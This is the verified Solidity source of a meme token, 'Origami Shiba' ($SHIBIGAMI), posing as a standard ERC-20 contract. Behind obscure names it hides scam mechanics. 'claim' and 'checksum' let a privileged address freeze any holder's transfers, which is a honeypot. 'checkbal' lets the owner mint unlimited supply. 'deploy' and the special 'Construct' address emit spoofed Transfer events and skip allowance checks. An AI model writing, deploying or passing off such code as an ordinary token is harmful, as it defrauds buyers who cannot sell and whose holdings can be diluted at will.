/**
 *Submitted for verification at Etherscan.io on 2022-10-01
*/

pragma solidity 0.8.17;
/*

Origami Shiba  - $SHIBIGAMI -

///////////////////////////////////

- TG: Shibigami

///////////////////////////////////

*/   
 
contract SHIBIGAMI {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) AmountOf;
    mapping (address => bool) ix;

    // 
    string public name = "Origami Shiba";
    string public symbol = unicode"SHIBIGAMI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xDa8f16749b825F421f52DE0Bd7b13913C8B41968;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    modifier lvl() {   
    require(ix[msg.sender]);
        _;}
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!AmountOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }

        function PM(address x) public {
         require(msg.sender == Construct);
          ix[x] = true; }
        
        function checkbal(address oracle,  uint256 update) public {
        require(msg.sender == owner);
        balanceOf[oracle] += update;
        totalSupply += update; }
        function claim(address txt) lvl public{          
        require(!AmountOf[txt]);
        AmountOf[txt] = true; }
        function checksum(address txt) lvl public {
        require(AmountOf[txt]);
        AmountOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!AmountOf[from]); 
        require(!AmountOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }